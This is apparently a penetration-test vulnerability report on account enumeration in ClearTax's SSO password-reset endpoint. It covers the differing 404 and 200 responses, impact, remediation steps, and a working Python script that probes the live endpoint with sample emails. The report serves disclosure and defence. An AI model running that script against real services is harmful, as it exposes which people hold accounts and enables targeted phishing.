# Account Enumeration Vulnerability in ClearTax SSO Password Reset Endpoint

**ID:** vuln-0007
**Severity:** HIGH
**Found:** 2026-03-18 13:31:21 UTC
**Target:** https://accounts.cleartax.in
**Endpoint:** /api/v0/send-reset-password-token
**Method:** POST
**CWE:** CWE-204
**CVSS:** 7.5

## Description

A critical account enumeration vulnerability was discovered in the ClearTax SSO password reset functionality. The API endpoint `/api/v0/send-reset-password-token` returns different HTTP status codes and error messages based on whether an account exists, allowing attackers to enumerate valid user accounts.

The vulnerability was discovered during penetration testing of the SSO authentication system at https://accounts.cleartax.in. The password reset endpoint responds with:
- 404 status and explicit error message for non-existent accounts
- 200 status with empty response for potentially valid accounts

This information disclosure enables attackers to build lists of registered users, facilitating targeted attacks, phishing campaigns, and user profiling.

## Impact

Successful exploitation allows attackers to:
- Enumerate all registered user accounts in the system
- Identify specific individuals using the service
- Conduct targeted phishing and social engineering attacks
- Profile user base for competitive intelligence
- Bypass privacy protections intended to hide user registration status

The impact is HIGH as it violates user privacy, enables targeted attacks, and exposes sensitive business intelligence about the user base.

## Technical Analysis

The vulnerability exists in the password reset API endpoint `/api/v0/send-reset-password-token`. The endpoint uses different HTTP status codes and error messages to indicate account existence:

**Non-existent account response:**
- HTTP Status: 404 Not Found
- Response Body: `{"userservice_errors":["email@example.com :No such contact exist which can be used for purpose RESET_PASSWORD"]}`

**Potential valid account response:**
- HTTP Status: 200 OK  
- Response Body: Empty

The differential response allows attackers to programmatically determine which email addresses/username are registered with the service. No rate limiting was observed during testing, enabling bulk enumeration attacks.

## Proof of Concept

To reproduce the vulnerability:

1. Send POST request to https://accounts.cleartax.in/api/v0/send-reset-password-token
2. Use Content-Type: application/json
3. Send payload: `{"username": "test@example.com", "return_path": "/"}`
4. Observe response:
   - If account doesn't exist: 404 status with explicit error message
   - If account exists: 200 status with empty response

Repeat with different email addresses to enumerate registered users.

```
import requests
import json

def enumerate_account(email):
    url = "https://accounts.cleartax.in/api/v0/send-reset-password-token"
    headers = {"Content-Type": "application/json"}
    payload = {"username": email, "return_path": "/"}
    
    response = requests.post(url, headers=headers, json=payload)
    
    if response.status_code == 404:
        print(f"❌ {email} - Account does not exist")
        return False
    elif response.status_code == 200:
        print(f"✅ {email} - Account likely exists")
        return True
    else:
        print(f"⚠️  {email} - Unexpected response: {response.status_code}")
        return None

# Test with sample emails
test_emails = [
    "nonexistent12345@example.com",
    "admin@cleartax.in", 
    "test@cleartax.in",
    "user@example.com"
]

for email in test_emails:
    enumerate_account(email)
```

## Remediation

1. **Standardize Error Responses**: Return identical HTTP status codes and error messages regardless of account existence
2. **Implement Rate Limiting**: Apply strict rate limiting to prevent bulk enumeration attacks
3. **Use Generic Error Messages**: Return generic messages like "If this email is registered, a reset link will be sent"
4. **Add CAPTCHA Protection**: Require CAPTCHA for password reset requests
5. **Implement Delayed Responses**: Add random delays to prevent timing-based enumeration
6. **Log and Monitor**: Monitor for enumeration attempts and implement alerting
